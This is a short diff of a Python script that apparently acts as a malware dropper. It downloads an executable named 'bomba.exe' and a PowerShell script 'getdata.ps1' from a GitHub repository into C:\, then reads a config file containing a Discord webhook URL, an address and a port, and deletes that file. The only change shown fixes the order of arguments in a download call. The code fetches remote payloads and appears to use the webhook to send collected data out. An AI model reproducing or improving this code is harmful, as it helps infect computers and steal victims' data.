@@ -142,7 +142,7 @@ os.chdir(value)
 if not os.path.exists(f"{value}\\have_done.txt"):
     path1 = download("https://github.com/thompog/bob/raw/refs/heads/main/bomba.exe", "bomba.exe", "C:\\", "5089855E172C9DA4340FC5097E85C8B26EDBE0414CADD83660C775F298AE1FDC")
     path2 = download("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1", "getdata.ps1", "C:\\", "8BC7BA0D901A3C6818C6408B52EB022D75C50110E68519D7BCDE9473094D1EE7")
-    path3 = download("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/config.txt", "C:\\", "config.txt", "82F3F0920C5EC5DEAEDA5058D8314E800D8DE0881E2036F2C886279E6F21D808")
+    path3 = download("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/config.txt", "config.txt", "C:\\", "82F3F0920C5EC5DEAEDA5058D8314E800D8DE0881E2036F2C886279E6F21D808")
 
     nfile = read_file("C:\\config.txt", remove="webhook = https://discord.com/api/webhooks/1487128618189717606/Jh4fhNACI4jLruL64J8wIfIdC_78LbQ1AJIQSp5lCtysEpOX7fJe8_ak6tUxT5A9C6HZ", remove1="address = 0.0.0.0", remove2="port = 9000", remove3="\n", remove4="url", remove5=" ", ramove6="=")
     os.remove("C:\\config.txt")
